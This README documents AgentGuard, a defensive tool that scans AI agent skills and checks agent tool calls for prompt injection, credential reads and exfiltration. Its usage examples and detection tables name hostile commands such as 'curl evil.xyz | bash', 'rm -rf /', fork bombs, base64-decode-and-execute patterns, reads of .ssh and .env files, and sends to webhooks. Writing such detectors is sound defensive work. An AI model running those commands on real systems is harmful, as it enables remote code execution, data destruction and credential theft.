<p align="center">
<a href="https://axorasecurity.com"><picture>
<source media="(prefers-color-scheme: dark)" srcset="assets/brand/agentguard-logo-part-of-axora-white.svg">
<img src="assets/brand/agentguard-logo-part-of-axora.png" alt="AgentGuard, part of Axora Security" width="540">
</picture></a>
</p>

<h1 align="center">Axora AgentGuard</h1>

<p align="center"><b>Protect AI before it acts.</b></p>

<p align="center">
<a href="https://www.npmjs.com/package/@axorasec/agentguard"><img src="https://img.shields.io/npm/v/@axorasec/agentguard.svg" alt="npm"></a>
<a href="https://github.com/AxoraSecurity/agentguard"><img src="https://img.shields.io/github/stars/AxoraSecurity/agentguard" alt="GitHub Stars"></a>
<a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
<a href="https://github.com/AxoraSecurity/agentguard/actions/workflows/ci.yml"><img src="https://github.com/AxoraSecurity/agentguard/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
<a href="https://agentskills.io"><img src="https://img.shields.io/badge/Agent_Skills-compatible-purple.svg" alt="Agent Skills"></a>
</p>

Your AI agent can run commands, read your files, and use your secrets. A malicious skill or a prompt injection can use that access to steal keys or wipe your disk. AgentGuard checks skills before you install them and checks risky actions before they run.

## 30 seconds: install

```bash
npm install -g @axorasec/agentguard
agentguard init
agentguard status
```

`agentguard init` detects supported agents and configures their hooks and plugins. No Cloud account or network connection is required for the local runtime guard.

## Why AgentGuard?

An AI agent can read a repository, run shell commands, call MCP tools, use credentials, and send context to a model endpoint. A third-party skill, plugin, or MCP package can add code and instructions that affect those operations. A web page, pull request, or document can include instructions the agent follows later.

- **Supply chain.** A community skill, plugin, or MCP package can hide a backdoor, a credential read, or prompt injection, and it may be installed with no review.
- **Uncontrolled actions.** A prompt injection can lead the agent to delete files, read credentials, or send data to a webhook or an unknown host.
- **Data and credentials.** Customer records, personal data, or API keys can go out with the context to an unofficial model endpoint.

Host permissions decide which tools an agent may use. AgentGuard looks at each specific operation and its parameters. On the paths the host supports, it reviews the component before you add it, evaluates a supported action before it runs, and writes the decision and the reason to a local audit log.

> Before trust, review the component. Before execution, evaluate the action. Before egress, guard the data.

Try it on one workflow you already run, such as a recursive delete, a `curl | bash` install, a new third-party package, or a credential read.

## What it does

### Review a component before you install it

AgentGuard DeepScan (`agentguard scan`) reads a local directory or an HTTPS GitHub repository before you install a skill, plugin, or MCP package. You can point the scan at a branch, tag, or commit. It checks code and `SKILL.md` for command execution, remote loading, credential reads, data exfiltration, and prompt injection, and returns a risk level, tags, and a summary. On supported hosts, session start can store a trust record for that source, version, and content hash. A version or hash change can drop the trust level and ask for a new review. See [Trust Management](docs/trust-cli.md).

### Check an action before it runs

On a host with a hook or plugin, AgentGuard evaluates the tool call before it runs, using the action, its parameters, and the active policy: Strict (`strict`), Balanced (`balanced`, default), or Observe (`permissive` in the CLI). The result is allow, require approval, or block. See [Outcomes](#outcomes) and [Protection levels](#protection-levels).

Examples include `rm -rf /`, fork bombs, `curl | bash`, writes to `.env` or `.ssh/`, and sends to Discord, Telegram, or Slack webhooks. Destructive commands and data exfiltration default to block. Remote code execution, credential access, and deploys default to require approval. Evaluation runs on the agent machine. How approval is presented depends on the host. See the host guide under [Documentation](#documentation).

### Check the environment and read the record

`/agentguard checkup` writes an HTML report. A scheduled patrol runs checks such as trust-registry hashes, exposed credentials, and the config baseline, and returns PASS, WARN, or FAIL. Events go to `~/.agentguard/audit.jsonl`, which `/agentguard report` reads. When the host can name the source, the event includes that skill or plugin.

### For teams and enterprises

The npm install above gives the local guard: component scans, runtime evaluation, patrol, checkup, and the local audit log. An inventory of agents, models, MCP servers, tools, knowledge bases, and outbound connections, plus centralized policy and security reports, needs Axora Security Cloud or a private deployment. Delivery is primarily private, with a hosted option for small pilots.

`agentguard connect` caches hosted policy and syncs redacted audit events. Evaluation stays on the agent machine. If Cloud is unreachable, enforcement continues with the cached policy or the bundled default policy, and Cloud-eligible events that fail to upload are spooled for retry. See [Connect OSS AgentGuard to Cloud](docs/cloud-connect.md).

To try this on one workflow, follow [30 seconds: install](#30-seconds-install), then the host guide under [Documentation](#documentation).

## Outcomes

| Outcome | What happens |
| --- | --- |
| allow | The action runs. |
| require approval | The action waits until a person approves it. |
| block | The action is stopped before it runs. |

The action API and MCP `decision` field use `allow`, `confirm`, and `deny`.
In the table above, `confirm` means require approval and `deny` means block.

The protection level controls which actions are allowed, sent for approval, or blocked.

## Protection levels

| Level | Behavior |
| --- | --- |
| Strict (`strict`) | Blocks dangerous and suspicious findings. Low-risk commands can still run. |
| Balanced (`balanced`, default) | Blocks dangerous actions and requires approval for risky ones. |
| Observe (`permissive` in the CLI) | Blocks critical threats only. |

## Compatibility

Axora AgentGuard follows the [Agent Skills](https://agentskills.io) open standard:

| Platform | Support | Features |
|----------|---------|----------|
| **Claude Code** | Full | Skill + hooks auto-guard, transcript-based skill tracking |
| **OpenClaw** | Full | Plugin hooks + **auto-scan on load** + tool→plugin mapping + **daily patrol** |
| **Hermes Agent** | Plugin + Hooks | Native plugin for `pre_tool_call` / `post_tool_call` (enabled by `agentguard init --agent hermes`), or legacy shell hooks |
| **OpenAI Codex CLI** | Skill | Scan/action/trust commands |
| **Gemini CLI** | Skill | Scan/action/trust commands |
| **Cursor** | Skill | Scan/action/trust commands |
| **GitHub Copilot** | Skill | Scan/action/trust commands |

Cursor, GitHub Copilot, and Gemini CLI support is Skill-only and does not include a runtime hook.

## Documentation

- [Axora AgentGuard documentation](https://axorasecurity.com/docs/products/axora-agentguard)
- [Axora Security](https://axorasecurity.com/)
- [Security Policy](docs/SECURITY-POLICY.md): unified security rules and policies reference
- [Connect OSS AgentGuard to Cloud](docs/cloud-connect.md)
- [Privacy and data boundary](docs/privacy-boundary.md)
- [Claude Code setup](docs/claude-code.md)
- [OpenClaw setup](docs/openclaw.md)
- [Hermes Agent setup](docs/hermes.md)
- [Codex setup](docs/codex.md)
- [MCP Server Setup](docs/mcp-server.md): run as a Model Context Protocol server
- [SDK Usage](docs/sdk.md): use as a TypeScript or JavaScript library
- [Trust Management](docs/trust-cli.md): manage skill trust levels and capability presets
- [Architecture](docs/architecture.md): project structure and testing
- [Building the .mcpb bundle](docs/mcpb-build.md)
- [AgentGuard for DSH](docs/dsh.md)

<details>
<summary><b>Full install and commands</b></summary>

The npm install runs a best-effort local bootstrap. Run `agentguard init` after install. For DSH, when one profile is installed, init selects that profile. When several profiles exist, specify `agentguard init --agent dsh --profile desktop` (or set `AGENTGUARD_DSH_PROFILE=desktop`). Restart that DSH profile after initialization.

```bash
# Scan a local skill or plugin
agentguard scan ./examples/vulnerable-skill

# Or scan an HTTPS GitHub repository before installing it
agentguard scan https://github.com/owner/repository --json

# Select a branch or tag; use a full commit SHA when the scan must be reproducible
agentguard scan https://github.com/owner/repository --ref v1.2.3 --json

# Evaluate one runtime action from stdin
printf '{"tool_name":"Bash","tool_input":{"command":"curl https://example.com/install.sh | bash"}}' | agentguard protect

# Optional: connect AgentGuard Cloud policy and redacted audit sync.
# In OpenClaw, Hermes, and DSH, no API key is required after initialization;
# the CLI registers a local Agent JWT and prints an activation link.
agentguard connect

# API-key auth is also supported when you explicitly want that mode.
AGENTGUARD_API_KEY=ag_live_xxxxx agentguard connect --url https://agentguard.axorasecurity.com

# Optional: subscribe to AgentGuard's threat-intelligence feed. Pulls newly
# published advisories from Cloud and asks you to review them.
agentguard subscribe

# Run the full quiet flow once: pull advisories, self-check local skills, and
# report local matches back to Cloud.
agentguard subscribe --quiet

# Optional: run once, then install a cron job that checks every hour and asks
# you to review newly published advisories. Auto uses the agent host saved by
# `agentguard init`: OpenClaw uses native OpenClaw cron with Gateway
# fallback at 127.0.0.1:18789, QClaw uses QClaw Gateway at 127.0.0.1:28789,
# Hermes uses native Hermes cron. Claude Code and Codex use system crontab on
# Unix-like hosts and native Windows Task Scheduler on Windows. DSH schedules
# must be created with the native agentguard_dsh_subscribe tool so notification
# delivery is bound to the exact calling DSH session.
# OpenClaw cron jobs keep runner delivery internal, then resolve the latest
# deliverable session route at runtime and send notifications directly there.
# QClaw cron jobs still use last-route announce delivery; no-notification runs
# print NO_REPLY. OpenClaw cron runs auto-detect the saved host type during
# `agentguard subscribe --cron-run`.
# If you pass `--cron-target openclaw` explicitly while a different saved host
# exists, AgentGuard now rejects that mismatch instead of installing a cron job
# that cannot notify correctly.
# If no agent host is saved, run `agentguard init --agent <agent>` first or
# pass --cron-target explicitly.
agentguard subscribe --cron "0 * * * *"

# For DSH, ask the active session to invoke agentguard_dsh_subscribe instead.
# The generic --cron form is rejected when DSH is the saved agent host because
# a standalone CLI process cannot determine the target DSH session id.

# Override cron backend selection when needed.
agentguard subscribe --cron "0 * * * *" --cron-target system
agentguard subscribe --cron "0 * * * *" --cron-target openclaw
agentguard subscribe --cron "0 * * * *" --cron-target qclaw
agentguard subscribe --cron "0 * * * *" --cron-target hermes
agentguard subscribe --cron "0 * * * *" --cron-target windows
# System cron and Windows Task Scheduler write output to
# ~/.agentguard/feed-cron.log. Windows tasks run as the current user and only
# while that user is logged on; no password or SYSTEM account is configured.
# Hermes cron writes a no-agent script under ~/.hermes/scripts/ and requires
# Hermes Gateway for automatic scheduled execution.

# Or install the hourly cron in quiet mode so matches are self-checked and
# reported automatically.
agentguard subscribe --cron "0 * * * *" --quiet

# Replace an existing cron job with the same name
agentguard subscribe --cron "0 * * * *" --force

# Machine-readable output always includes a cron status object:
# cron.requested, cron.installed, and optional cron.result when installation succeeds.
agentguard subscribe --json

# Or run a one-off self-check against a single advisory id
agentguard checkup --against-advisory AGS-2026-0042

# Re-run host setup manually when needed. Bare init auto-detects installed agents.
agentguard init
agentguard init --agent claude-code
agentguard init --agent codex
agentguard init --agent openclaw
agentguard init --agent hermes        # native Hermes plugin (add --shell-hooks for the legacy flow)
agentguard init --agent qclaw
agentguard init --agent dsh           # native bundle in the default web profile; restart DSH
```

### Optional: enhanced privacy mode

AgentGuard's deterministic rules find personal data written as `field: value`.
They recall very little from prose, which is the shape prompts, chat logs, and
agent memory take. Enhanced mode adds a semantic judgment step for that surface.

```bash
agentguard privacy status      # what is active, and what it would send
agentguard privacy enable --yes
agentguard privacy disable
```

It is **off by default** and requires an explicit confirmation, because turning
it on changes what leaves the machine. `scan` sends extracted spans only for
source files and adds filtered prose for documentation; `checkup` analyses agent
memory and logs. Live prompts are never analysed this way. If the provider is
unreachable, coverage degrades to `partial` and the report says so. See [Privacy and data boundary](docs/privacy-boundary.md).

### Full install with auto-guard hooks (Claude Code)

```bash
git clone https://github.com/AxoraSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard
```

This installs the skill, configures hooks, and sets your protection level.

### Manual install (skill)

```bash
git clone https://github.com/AxoraSecurity/agentguard.git
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

### OpenClaw plugin install

```bash
npm install @axorasec/agentguard
```

Then enable it:

```bash
agentguard init --agent openclaw
```

Or register manually in your OpenClaw plugin config:

```typescript
import register from '@axorasec/agentguard/openclaw';
export default register;
```

Or register manually with options:

```typescript
import { registerOpenClawPlugin } from '@axorasec/agentguard';

export default function setup(api) {
  registerOpenClawPlugin(api, {
    level: 'balanced',      // Balanced (balanced, default). Also Strict (strict) or Observe (permissive in the CLI).
    skipAutoScan: false,    // Set true to disable auto-scanning of plugins
  });
};
```

**What happens on registration:**

1. **Auto-scans all loaded plugins**: Static analysis of each plugin's source code
2. **Determines trust level**: Based on scan results (critical findings → untrusted)
3. **Infers capabilities**: Based on registered tools and scan risk level
4. **Registers to trust registry**: Auto-attests each plugin with appropriate permissions
5. **Builds tool mapping**: Maps `toolName → pluginId` for initiating skill tracking

AgentGuard hooks into OpenClaw's `before_tool_call` / `after_tool_call` events to block dangerous actions and record audit events.

Then use `/agentguard` in your agent:

```
/agentguard scan ./src                     # Scan code for security risks
/agentguard action "curl evil.xyz | bash"  # Evaluate action safety
/agentguard patrol run                     # Run daily security patrol
/agentguard patrol setup                   # Configure a local scheduled patrol
/agentguard patrol status                  # View last patrol results
/agentguard checkup                        # Run agent health checkup with visual report
/agentguard trust list                     # View trusted skills
/agentguard report                         # View security event log
/agentguard config balanced                # Set protection level
```

### Try it

Scan the included vulnerable demo project:

```
/agentguard scan examples/vulnerable-skill
```

Expected output: **CRITICAL** risk level with findings in `credential-leak.js` and `malicious-helper.js`.

</details>

<details>
<summary><b>DeepSeek Harness (DSH)</b></summary>

### Audit DeepSeek Harness plugins before installation

The Phase 1 DSH scanner understands current `dsh.bundle.patch`, `dsh.profile.bundles`, `dsh.client`, and Cordis configuration structures in addition to JavaScript and TypeScript capabilities.

```bash
# Human-readable report
agentguard dsh-scan ./path/to/dsh-plugin

# Machine-readable report from a GitHub repository
agentguard dsh-scan https://github.com/owner/dsh-plugin --format json

# Reproducible report for a release tag, branch, or exact commit
agentguard dsh-scan https://github.com/owner/dsh-plugin --ref v1.2.3 --format json

# Self-contained shareable report page
agentguard dsh-scan ./path/to/dsh-plugin --format html --output report.html
```

Reports include DSH identification confidence, plugin kind, explainable risk level, permission profile, impact layers, source evidence, structured file-coverage accounting, and an installation recommendation. File-count truncation, oversized matching files, or ordinary read failures produce `DSH_SCAN_INCOMPLETE` and can never return `safe-to-try`. See [AgentGuard for DSH](docs/dsh.md) for the risk model and current limitations.

Install AgentGuard in the profile your DSH host uses, then restart that host. For **DSH Desktop**:

```bash
dsh plugin --profile desktop add --allow-build=@axorasec/agentguard @axorasec/agentguard
```

For **`dsh web`** instead:

```bash
dsh plugin --profile web add --allow-build=@axorasec/agentguard @axorasec/agentguard
```

DSH will expose the read-only `agentguard_dsh_scan` tool for scanning local plugin directories and HTTPS GitHub repositories before installation.
It also exposes `agentguard_dsh_scan_batch` for a sequential review queue of up to 10 targets per DSH tool call. The CLI accepts larger JSON manifests of up to 25 targets with `agentguard dsh-scan-batch`.
Use `agentguard_dsh_compare` or the `agentguard dsh-compare` CLI command to identify new permissions and runtime risks before updating an approved plugin version.
The native `agentguard_dsh_subscribe` tool binds system-cron threat-feed polling to the current DSH agent. `agentguard_dsh_subscription_status` reports bounded cron and queue metadata without notice contents, and exact-target `agentguard_dsh_unsubscribe` removes cron, matching queued notices, then saved state in retry-safe order. Notification-worthy pulls are durably queued across DSH downtime and delivered as a safe ordinary follow-up only to that exact live agent; delivery never automatically executes scans or remediation. Scheduled self-checks also discover DSH user/project skills, immediate profile manifests, declared direct dependencies, and home/profile Cordis patches without recursively walking dependency trees. See the [DSH subscription and local testing guide](docs/dsh.md#subscribe-to-threat-intelligence-from-dsh).

Update or remove the bundle in the **same** profile you installed it in (for example, `dsh plugin --profile desktop update @axorasec/agentguard` or `dsh plugin --profile desktop remove @axorasec/agentguard`). The [DSH operations and report guide](docs/dsh.md#operate-the-dsh-installation) includes verification and troubleshooting steps.

> **DSH runtime guard:** the packaged composition enables `protect` mode by default, applying AgentGuard's shared allow, require approval, or block policy before DSH dispatches a tool. Startup logs and the input-redacted `agentguard_dsh_runtime_summary` tool explicitly show the current configured mode and whether pre-execute enforcement is active. Set `runtime.mode: observe` only when audit-only shadow evaluation is required. DSH protection uses DSH's native one-shot approval service and monotonic composition with other policies. Optional `runtime.postResponseMode: block-malicious` suppresses only block-class malicious network results; approval-class post results remain audit-only because DSH has no resumable post-result approval protocol. Exact operator-configured `runtime.attribution.toolOwners` bindings add source ownership without guessing, and `runtime.ownerPolicies` can impose per-owner minimum decisions without weakening shared security policy. Unmapped tools remain `unknown` until DSH exposes a reliable native owner field. See the [DSH runtime guide](docs/dsh-runtime.md).

The complete candidate scope, activation override, acceptance gates, and intentional boundaries are collected in [AgentGuard for DSH complete candidate](docs/dsh-complete-candidate.md).

The enforcing adapter maps approval decisions to DSH's native `ask` contract, emits bounded evidence-free reasons, preserves stronger downstream policies, fails closed on unexpected evaluator errors by default, and is registered whenever `protect` is configured, including by the packaged default composition.

Native contract gates cover the full pre-execute approval outcome matrix, concurrent and nested calls, failures, unload, and post-execute result containment. Block-class malicious responses can be suppressed explicitly; approval-class post results remain audit-only because DSH currently exposes no native post-approval resume primitive. The complete candidate passed all 11 guided DSH UAT cases, including native approval/rejection, pre-execute blocking, response containment, redaction, and service stability.

The shared runtime detector treats unpinned Git sources executed through `npx`, `npm exec`, `pnpm dlx`, `yarn dlx`, or `bunx` as high-risk remote code execution. Full commit pins reduce this to a warning rather than making remote code implicitly trusted.

Phase 1.1 keeps the conservative full-repository risk while adding a separate runtime-surface risk, evidence source categories, likely-generated markers, and a human-review priority. Tests, examples, docs, and data findings remain visible instead of being silently discarded.

Phase 1.2 treats active `SKILL.md` and agent-instruction files as runtime-relevant, keeps executable source runtime-relevant even under `data/` or `assets/`, distinguishes computed local module loading from remote code execution, and requires concrete credential APIs before reporting keychain access.

Phase 1.3 localizes compound `AUTO_UPDATE` evidence around the matched update behavior. Large bundled or third-party JavaScript files no longer become critical merely because unrelated network and execution tokens appear elsewhere in the same file; executable files under `assets/` remain visible to prevent path-based evasion.

Phase 1.4 separates eval-like `DYNAMIC_CODE_EXECUTION` from encoded or packed-code `OBFUSCATION`. DSH reports aggregate repeated matches by rule and file, retain the total occurrence count, and keep generated runtime bundles security-relevant instead of treating source maps as proof of safety.

The Phase 1 release candidate freezes those rule semantics and adds an exact-commit real-world regression gate. See [the RC acceptance plan](docs/dsh-phase1-rc.md) and [benchmark policy](benchmarks/dsh/README.md).

</details>

<details>
<summary><b>Daily patrol</b></summary>

The patrol runs 8 checks on a schedule for OpenClaw, Windows Task Scheduler, and system crontab, and it produces a structured report.

### Patrol Checks

| # | Check | What It Does |
|---|-------|-------------|
| 1 | **Skill/Plugin Integrity** | Compares file hashes against the trust registry and detects tampered or unregistered skills |
| 2 | **Secrets Exposure** | Scans workspace, memory, logs, `.env`, `~/.ssh/`, and `~/.gnupg/` for leaked API keys, SSH keys, and cloud credentials |
| 3 | **Network Exposure** | Detects dangerous ports bound to `0.0.0.0` (Redis, Docker API, MySQL, etc.), checks firewall status, flags suspicious outbound connections |
| 4 | **Cron & Scheduled Tasks** | Audits cron jobs and systemd timers for `curl\|bash`, `base64 -d\|bash`, and other download-and-execute patterns |
| 5 | **File System Changes (24h)** | Finds recently modified files, runs the scanner on them, checks permissions on critical files, and detects new executables |
| 6 | **Audit Log Analysis (24h)** | Flags skills denied 3+ times, CRITICAL events, exfiltration attempts, and prompt injection detections |
| 7 | **Environment & Configuration** | Verifies the protection level and validates config baseline integrity |
| 8 | **Trust Registry Health** | Flags expired attestations, stale trusted skills (30+ days), installed-but-untrusted skills, over-privileged entries |

### Usage

```bash
# Run all 8 checks now
/agentguard patrol run

# Set up as a daily scheduled job (03:00 UTC through OpenClaw;
# 03:00 machine-local time through Windows Task Scheduler or system crontab)
/agentguard patrol setup

# Check last patrol results and cron schedule
/agentguard patrol status
```

### Patrol Report

Each patrol produces a report with an overall status:

| Status | Meaning |
|--------|---------|
| **PASS** | Low or medium findings |
| **WARN** | HIGH severity findings detected |
| **FAIL** | CRITICAL severity findings detected |

Reports include per-check status, finding counts, detailed findings for checks with issues, and actionable recommendations. Results are also logged to `~/.agentguard/audit.jsonl`.

### Setup Options

`patrol setup` configures OpenClaw cron, a current-user Windows Task Scheduler task, or user crontab according to the detected host:

Windows Task Scheduler and user crontab invoke the existing
`agentguard checkup --json` command so scheduled patrols execute the eight
checks. SessionStart continues to use the lightweight `auto-scan.js` path.

- **Timezone**: defaults to UTC for OpenClaw and machine-local time for Windows Task Scheduler or system crontab
- **Schedule**: defaults to `0 3 * * *` (daily at 03:00)
- **Notifications**: optional Telegram, Discord, or Signal alerts

> **Note:** Windows patrol tasks run while the creating user is logged on. They do not store a password or use SYSTEM privileges.

</details>

<details>
<summary><b>Agent health checkup</b></summary>

The checkup evaluates the agent's security posture and writes a visual HTML report. The report includes a lobster mascot whose appearance reflects the result.

```
/agentguard checkup
```

### What It Checks

| Dimension | What's Evaluated |
|-----------|-----------------|
| **Code Safety** | Scan findings across all installed skills plus direct DSH profile plugins (transitive dependencies excluded) |
| **Trust Hygiene** | Trust registry health: expired, stale, unregistered, over-privileged entries |
| **Runtime Defense** | Audit log analysis: threats blocked, attack patterns, allow / require approval / block ratios |
| **Secret Protection** | Credential exposure: file permissions, env vars, hardcoded secrets |
| **Config Posture** | Protection level, guard hooks, auto-scan, patrol history |

### The Lobster Scale

Your agent's health is visualized by a lobster mascot:

| Score | Tier | Lobster | Message |
|-------|------|---------|---------|
| 90-100 | **S** | 💪 Muscular bodybuilder with crown & sunglasses | *"Your agent is JACKED!"* |
| 70-89 | **A** | 🛡️ Healthy lobster with shield | *"Looking solid!"* |
| 50-69 | **B** | ☕ Tired lobster with coffee, sweating | *"Needs a workout..."* |
| 0-49 | **F** | 🚨 Sick lobster with bandages & thermometer | *"CRITICAL CONDITION!"* |

The report is a self-contained HTML file that opens automatically in your browser. Dark theme, animated score gauge, expandable findings, and actionable recommendations.

</details>

<details>
<summary><b>Hook limitations</b></summary>

Auto-guard hooks run on Claude Code (`PreToolUse` / `PostToolUse`), OpenClaw (`before_tool_call` / `after_tool_call`), and Hermes Agent (`pre_tool_call` / `post_tool_call` shell hooks). These platforms share the same decision engine through one adapter layer.

- **Default-deny policy**: The first use of some commands may ask for confirmation. A built-in safe-command allowlist (`ls`, `echo`, `pwd`, `git status`, and similar) reduces false positives.
- **Skill source tracking**:
  - Claude Code infers which skill started an action from the conversation transcript. The inference is heuristic.
  - OpenClaw uses the tool-to-plugin mapping built at registration.
  - Hermes Agent uses session and tool metadata when that metadata is present. Most shell-hook payloads do not name an initiating skill.
- **Skill installation**: Hooks apply to tool calls such as Bash, Write, and WebFetch after a skill has loaded. They cannot block the Skill tool invocation itself.
- **OpenClaw scan timing**: Plugins are scanned asynchronously after AgentGuard registration completes. A tool call that arrives immediately after startup may run before that scan finishes.

</details>

<details>
<summary><b>OpenClaw integration</b></summary>

AgentGuard provides deep integration with OpenClaw through automatic plugin scanning, trust management, and daily security patrols.

### How it works

When AgentGuard registers as an OpenClaw plugin:

```
┌─────────────────────────────────────────────────────────────────┐
│  OpenClaw loads AgentGuard plugin                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  AgentGuard scans all loaded plugins (async, non-blocking)      │
│  • Reads plugin source from registry                            │
│  • Runs static analysis rules                                   │
│  • Calculates artifact hash                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  For each plugin:                                               │
│  • Determine trust level (untrusted/restricted/trusted)         │
│  • Infer capabilities from tools + scan results                 │
│  • Register to AgentGuard trust registry                        │
│  • Map tool names → plugin ID                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  On every tool call:                                            │
│  • Look up plugin from tool name                                │
│  • Check plugin trust level & capabilities                      │
│  • Evaluate action against security policies                    │
│  • Allow / Require approval / Block                             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Daily patrol (via cron):                                       │
│  • Run 8 security checks against the environment                │
│  • Verify skill integrity, detect secrets, audit logs           │
│  • Generate report (PASS / WARN / FAIL)                         │
│  • Send notifications (Telegram / Discord / Signal)             │
└─────────────────────────────────────────────────────────────────┘
```

### Exported utilities for OpenClaw

```typescript
import {
  registerOpenClawPlugin,
  getPluginIdFromTool,
  getPluginScanResult,
} from '@axorasec/agentguard';

// Get which plugin registered a tool
const pluginId = getPluginIdFromTool('browser');
// → 'my-browser-plugin'

// Get cached scan result
const scanResult = getPluginScanResult('my-browser-plugin');
// → { riskLevel: 'low', riskTags: [] }
```

</details>

<details>
<summary><b>Roadmap</b></summary>

Checked items are done. Unchecked items are roadmap.

### v1.1: Detection Enhancement
- [x] Extend scanner rules to Markdown files (detect malicious SKILL.md)
- [x] Base64 payload decoding and re-scanning
- [x] New rules: TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING
- [x] Safe-command allowlist to reduce hook false positives
- [x] Plugin manifest (`.claude-plugin/`) for one-step install

### v1.5: Daily Patrol
- [x] `patrol run`: 8-check security posture assessment
- [x] `patrol setup`: OpenClaw cron job configuration with timezone and notifications
- [x] `patrol status`: Last results and schedule overview
- [x] Skill/plugin integrity verification (hash drift detection)
- [x] Secrets exposure scanning (API keys, SSH keys, cloud credentials)
- [x] Network exposure and firewall checks
- [x] Audit log pattern analysis (repeat denials, exfiltration attempts)

### v1.6: Agent Health Checkup
- [x] `checkup`: security health assessment
- [x] Visual HTML report with lobster mascot (4 tiers)
- [x] Animated score gauge, dimension cards, expandable findings
- [x] Scoring covers Code Safety, Trust Hygiene, Runtime Defense, Secret Protection, and Config Posture
- [x] Premium upgrade CTA integration

### v2.0: Multi-Platform
- [x] OpenClaw gateway plugin integration
- [x] `before_tool_call` / `after_tool_call` hook wiring
- [x] Multi-platform adapter abstraction layer (Claude Code + OpenClaw)
- [x] Auto-scan plugins on OpenClaw registration
- [x] Tool→plugin mapping for initiating skill tracking
- [x] Auto-register scanned plugins to trust registry
- [ ] OpenAI Codex CLI sandbox adapter
- [ ] Federated trust registry across platforms

### v3.0: Ecosystem
- [ ] Threat intelligence feed (shared C2 IP/domain blocklist)
- [ ] Skill marketplace automated scanning pipeline
- [ ] VS Code extension for IDE-native security
- [ ] Community rule contributions (open rule format)

</details>

<details>
<summary><b>Detection rules</b></summary>

| Category | Rules | Severity |
| --- | --- | --- |
| **Execution** | SHELL_EXEC, DYNAMIC_MODULE_LOADING, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN | MEDIUM-CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
| **Dynamic execution and obfuscation** | DYNAMIC_CODE_EXECUTION, OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
| **Trojan and social engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM-CRITICAL |

</details>

## License

[MIT](LICENSE)

## Contributing

Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Found a security vulnerability? See [SECURITY.md](SECURITY.md).

Built by [Axora Security](https://github.com/AxoraSecurity).
